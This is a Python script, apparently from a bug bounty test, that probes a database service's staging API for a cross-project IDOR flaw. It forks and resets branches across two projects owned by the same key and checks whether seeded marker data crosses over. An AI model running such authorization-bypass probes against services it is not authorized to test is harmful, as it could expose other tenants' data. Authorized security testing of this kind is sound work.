# -*- coding: utf-8 -*-
"""ANGLE-3: cross-project isolation on branch fork.
Same API key owns project A (orange-sun-90493739) and project B (broad-violet-25805528).
Q: does POST /projects/B/branches with parent_id=<branch-of-A> validate that the
parent branch belongs to project B? If not -> cross-project data copy (IDOR class).
"""
import json
import time
import ssl
import http.client
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PB = "broad-violet-25805528"
PAMAIN = "br-wandering-field-w2ob6mpn"
LOG = r"F:\scan\neon_report\_u13_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def call(method, path, body=None, timeout=60):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def pw_of(pid, bid):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (pid, bid))
    if st != 200:
        return None
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return u.hostname, u.username, u.password


# 0. what projects does this key see?
st, d = call("GET", "/projects")
out("projects: %s" % st)
for p in json.loads(d).get("projects", []):
    out("  %s role=%s" % (p.get("id"), p.get("role")))
st, d = call("GET", "/projects/shared")
out("shared projects: %s %s" % (st, d[:300]))

# 1. cleanup u13-* on both projects
for pid in (PA, PB):
    st, d = call("GET", "/projects/%s/branches" % pid)
    for b in json.loads(d).get("branches", []):
        if b.get("name", "").startswith("u13-"):
            call("DELETE", "/projects/%s/branches/%s" % (pid, b["id"]))
            out("cleaned %s/%s" % (pid, b["name"]))

# 2. marker branch on project A
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u13-marker", "parent_id": PAMAIN},
              "endpoints": [{"type": "read_write"}]})
out("marker create: %s %s" % (st, d[:150]))
MARK = json.loads(d)["branch"]["id"]
hp = None
for i in range(15):
    hp = pw_of(PA, MARK)
    if hp:
        break
    time.sleep(4)
conn = None
for i in range(15):
    try:
        conn = connect(*hp)
        break
    except Exception:
        time.sleep(4)
query(conn, "create table u13_x(id int, tag text)")
query(conn, "insert into u13_x values (1,'CROSS-PROJECT-MARKER-%s')" % MARK[:8])
out("marker seeded on A: %s" % repr(query(conn, "select * from u13_x")))
conn.close()

# 3. attempt: fork A-branch INSIDE project B
st, d = call("POST", "/projects/%s/branches" % PB,
             {"branch": {"name": "u13-xprobe", "parent_id": MARK},
              "endpoints": [{"type": "read_write"}]})
out("== CROSS-PROJECT fork (B <- A): %s %s" % (st, d[:400]))
cross_ok = False
if st in (200, 201):
    try:
        XB = json.loads(d)["branch"]["id"]
        out("  -> 201! child branch id=%s ra=%s" % (XB, json.loads(d)["branch"].get("restricted_actions")))
        time.sleep(3)
        hp2 = pw_of(PB, XB)
        for i in range(20):
            try:
                c2 = connect(*hp2)
                rows = query(c2, "select * from u13_x")
                c2.close()
                out("  child data on B: %s" % repr(rows))
                if rows and "CROSS-PROJECT-MARKER" in str(rows[0]):
                    cross_ok = True
                break
            except Exception as e:
                time.sleep(5)
        out(">>> CROSS-PROJECT DATA COPY: %s" % cross_ok)
        call("DELETE", "/projects/%s/branches/%s" % (PB, XB))
        out("cleaned u13-xprobe")
    except Exception as e:
        out("  parse err: %s" % str(e)[:200])

# 4. control: same-project fork must work (sanity)
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u13-ctrl", "parent_id": MARK}})
out("control same-project fork: %s %s" % (st, d[:200]))
if st in (200, 201):
    call("DELETE", "/projects/%s/branches/%s" % (PA, json.loads(d)["branch"]["id"]))

# 5. also try restore/copy endpoints cross-project? reset uses source_branch_id
st, d = call("POST", "/projects/%s/branches/%s/reset" % (PB, "br-steep-butterfly-w28q06zr"),
             {"source_branch_id": MARK})
out("cross-project reset (B branch <- A src): %s %s" % (st, d[:300]))

# cleanup marker
call("DELETE", "/projects/%s/branches/%s" % (PA, MARK))
out("cleaned u13-marker")
print("== DONE", flush=True)
